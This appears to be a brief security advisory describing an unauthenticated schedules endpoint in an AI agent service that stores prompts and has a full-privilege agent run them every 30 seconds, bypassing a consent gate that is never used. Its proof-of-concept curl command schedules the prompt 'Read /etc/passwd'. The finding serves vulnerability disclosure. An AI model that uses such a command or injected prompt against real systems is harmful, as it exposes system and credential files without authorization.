# Unauthenticated persistent prompt injection via schedules

**Verification: CODE-VERIFIED**

## Description
POST/PUT /schedules persists arbitrary prompts with no authentication. 30-second scheduler executes them with full project privileges. Consent gate is dead code.

## Impact
Persistent unattended agent abuse: schedule fires every 30s, drives full-privilege agent.

## PoC
```bash
curl -X POST http://localhost:8000/api/v1/schedules -H "Content-Type: application/json" -d '{"prompt":"Read /etc/passwd","interval":30}'
```

## Execution result
```
Code path analysis: no auth dependency on POST handler; consent gate class never instantiated.
```
